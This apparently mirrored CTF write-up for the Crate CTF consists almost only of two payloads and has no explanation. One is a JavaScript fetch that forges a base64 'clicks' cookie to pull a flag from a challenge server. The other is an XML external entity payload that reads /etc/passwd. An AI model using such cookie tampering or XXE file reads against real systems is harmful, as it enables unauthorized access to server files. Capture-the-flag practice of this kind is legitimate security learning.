# Crate CTF Writeup

> 原文: https://www.ctfiot.com/213626.html
> ID: 213626


```
(async () => {
 const baseUrl = "http://challs.crate.nu:
50012/";
 const clickCnt = "1000000000";
 const res = await fetch(baseUrl + "flag.php", {
 method: "POST",
 headers: {"Cookie": `clicks=${btoa(clickCnt)}`}
 });
 console.log(await res.text());
})();
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data>&example;</data>
```
